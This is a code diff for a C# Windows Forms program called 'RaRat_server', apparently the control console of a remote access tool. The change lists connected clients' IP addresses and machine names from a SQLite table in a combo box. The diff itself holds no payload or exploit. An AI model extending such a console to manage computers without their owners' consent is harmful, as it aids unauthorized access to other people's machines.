@@ -7,6 +7,9 @@ using System.Linq;
 using System.Text;
 using System.Windows.Forms;
 using System.Data.SQLite;
+using System.Linq;
+
+
 
 namespace RaRat_server
 {
@@ -41,20 +44,47 @@ namespace RaRat_server
 
         private void SetConnection() {
             sql_con = new SQLiteConnection("Data Source=database.db;version=3;New=False;Compress=True;");
+
         }
 
-        private void LoadData() {
+        private int HowManyClients() {
             SetConnection();
             sql_con.Open();
             sql_cmd = sql_con.CreateCommand();
-            String CommandText = "select client_id, client_ip from client_table";
+            String CommandText = "select client_ip from client_table";
             DB = new SQLiteDataAdapter(CommandText, sql_con);
             DS.Reset();
             DB.Fill(DS);
             DT = DS.Tables[0];
             sql_con.Close();
             string res = convertDataTableToString(DT);
-            richTextBox1.Text = res;
+            char ch = '$';
+            int freq = res.Count(f => (f == ch));
+            return freq;
+        
+        }
+        private string[] LoadData() {
+            SetConnection();
+            sql_con.Open();
+            sql_cmd = sql_con.CreateCommand();
+            String CommandText = "select client_ip from client_table";
+            DB = new SQLiteDataAdapter(CommandText, sql_con);
+            DS.Reset();
+            DB.Fill(DS);
+            DT = DS.Tables[0];
+            sql_con.Close();
+            string res = convertDataTableToString(DT);
+            sql_con.Open();
+            sql_cmd = sql_con.CreateCommand();
+            CommandText = "select client_mc from client_table";
+            DB = new SQLiteDataAdapter(CommandText, sql_con);
+            DS.Reset();
+            DB.Fill(DS);
+            DT = DS.Tables[0];
+            sql_con.Close();
+            string res2 = convertDataTableToString(DT);
+            string[] output = { res, res2};
+            return output;
 
         }
 
@@ -67,6 +97,18 @@ namespace RaRat_server
 
             InitializeComponent();
             richTextBox1.Text = " Welcome to RaRat v0.1 \n\r ====================";
+            int number_clients = HowManyClients();
+
+            for (int i = 0; i < number_clients; i++)
+            {
+                string array_client_ips = LoadData()[0];
+                string[] client_ips = array_client_ips.Split('$');
+                string[] clients = client_ips[i].Split(':');
+                string array_client_mc = LoadData()[1];
+                string[] client_mc = array_client_mc.Split('$');
+                string[] clientsmc = client_mc[i].Split(':');
+                comboBox1.Items.AddRange(new object[] { clients[1]+" \'"+clientsmc[1] + "\'" });
+            }
         }
 
         private void richTextBox1_TextChanged(object sender, EventArgs e)
@@ -86,7 +128,30 @@ namespace RaRat_server
 
         private void button13_Click(object sender, EventArgs e)
         {
-            LoadData();
+            //richTextBox1.Text= "fuck";
+            int number_clients = HowManyClients();
+
+            for (int i=0; i<number_clients;i++) {
+                string array_client_ips = LoadData()[0];
+                string[] client_ips = array_client_ips.Split('$');
+                string[] clients = client_ips[i].Split(':');
+                richTextBox1.Text = richTextBox1.Text +"\n\r" +clients[1];
+
+            }
+
+
+
+        }
+
+
+        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void button10_Click(object sender, EventArgs e)
+        {
+            
         }
     }
 }
